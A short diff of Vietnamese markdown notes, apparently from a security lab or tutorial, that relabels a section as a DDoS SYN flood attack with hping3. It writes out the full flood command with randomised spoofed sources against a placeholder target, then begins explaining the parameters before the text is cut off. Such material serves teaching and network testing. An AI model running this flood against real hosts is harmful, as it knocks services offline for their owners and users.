@@ -1,4 +1,7 @@
-Sử dụng câu lệnh hping3 để thực hiện kịch bản:
+**Mô tả:** Tấn công DDoS SYN Flood bằng hping3
+
+**Câu lệnh thực thi:**
+```bash
 hping3 -c 1000 -d 120 -S -w 64 -p 21 --flood --rand-source <ip-target>
 
 Lệnh hping3 có các tham số sau:
